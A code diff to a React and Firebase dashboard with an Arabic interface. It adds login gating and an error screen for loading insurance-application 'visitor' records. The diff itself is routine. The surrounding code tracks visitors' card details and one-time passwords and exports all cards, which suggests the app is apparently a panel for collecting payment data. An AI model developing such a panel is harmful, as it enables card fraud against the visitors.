@@ -12,6 +12,7 @@ import { VisitorSidebar } from "@/components/visitor-sidebar";
 import { VisitorDetails } from "@/components/visitor-details";
 import { DashboardHeader } from "@/components/dashboard-header";
 import { ProtectedRoute } from "@/components/protected-route";
+import { useAuth } from "@/lib/auth-context";
 import { Timestamp } from "firebase/firestore";
 import { toast } from "sonner";
 
@@ -177,6 +178,7 @@ const showCardNotification = (visitors: InsuranceApplication[]) => {
 };
 
 export default function Dashboard() {
+  const { user, loading: authLoading } = useAuth();
   const [applications, setApplications] = useState<InsuranceApplication[]>([]);
   const [selectedVisitor, setSelectedVisitor] =
     useState<InsuranceApplication | null>(null);
@@ -187,6 +189,7 @@ export default function Dashboard() {
   const [cardFilter, setCardFilter] = useState<"all" | "hasCard">("all");
   const [selectedIds, setSelectedIds] = useState<Set<string>>(new Set());
   const [loading, setLoading] = useState(true);
+  const [loadError, setLoadError] = useState<string | null>(null);
   const [isExportingAllCards, setIsExportingAllCards] = useState(false);
   const [sidebarWidth, setSidebarWidth] = useState(215); // Default landscape width
   const hasLoadedInitialSnapshotRef = useRef(false);
@@ -207,6 +210,22 @@ export default function Dashboard() {
 
   // Subscribe to Firebase
   useEffect(() => {
+    if (authLoading) {
+      return;
+    }
+
+    if (!user) {
+      setLoading(false);
+      setLoadError(null);
+      return;
+    }
+
+    setLoading(true);
+    setLoadError(null);
+    hasLoadedInitialSnapshotRef.current = false;
+    previousCardStateRef.current = new Map();
+    previousOtpStateRef.current = new Map();
+
     const unsubscribe = subscribeToApplications((apps) => {
       const isInitialSnapshot = !hasLoadedInitialSnapshotRef.current;
 
@@ -317,10 +336,16 @@ export default function Dashboard() {
 
         return prev;
       });
+    }, {
+      onError: (error) => {
+        console.error("Applications subscription failed:", error);
+        setLoadError("تعذر تحميل بيانات الزوار. تأكد من تسجيل الدخول وصلاحيات Firebase.");
+        setLoading(false);
+      },
     });
 
     return () => unsubscribe();
-  }, []);
+  }, [authLoading, user]);
 
   useEffect(() => {
     if (typeof window === "undefined") return;
@@ -458,19 +483,33 @@ export default function Dashboard() {
     }
   };
 
-  if (loading) {
-    return (
+  return (
+    <ProtectedRoute>
+    {loadError ? (
+      <div className="min-h-dvh flex items-center justify-center bg-gray-50 px-6">
+        <div className="max-w-md rounded-2xl border border-red-200 bg-white p-6 text-center shadow-sm">
+          <div className="mx-auto mb-4 flex h-12 w-12 items-center justify-center rounded-full bg-red-50 text-red-600">
+            !
+          </div>
+          <h1 className="text-lg font-semibold text-slate-900">فشل تحميل البيانات</h1>
+          <p className="mt-2 text-sm leading-6 text-slate-600">{loadError}</p>
+          <button
+            type="button"
+            onClick={() => window.location.reload()}
+            className="mt-5 inline-flex items-center justify-center rounded-lg bg-slate-900 px-4 py-2 text-sm font-medium text-white transition hover:bg-slate-800"
+          >
+            إعادة المحاولة
+          </button>
+        </div>
+      </div>
+    ) : loading ? (
       <div className="min-h-dvh flex items-center justify-center bg-gray-50">
         <div className="text-center">
           <div className="animate-spin rounded-full h-12 w-12 border-b-2 border-green-600 mx-auto"></div>
           <p className="mt-4 text-gray-600">جاري التحميل...</p>
         </div>
       </div>
-    );
-  }
-
-  return (
-    <ProtectedRoute>
+    ) : (
     <div
       className="min-h-screen h-dvh flex flex-col bg-gradient-to-br from-slate-50 via-gray-50 to-indigo-50/40"
       dir="rtl"
@@ -544,6 +583,7 @@ export default function Dashboard() {
         </div>
       </div>
     </div>
+    )}
     </ProtectedRoute>
   );
 }
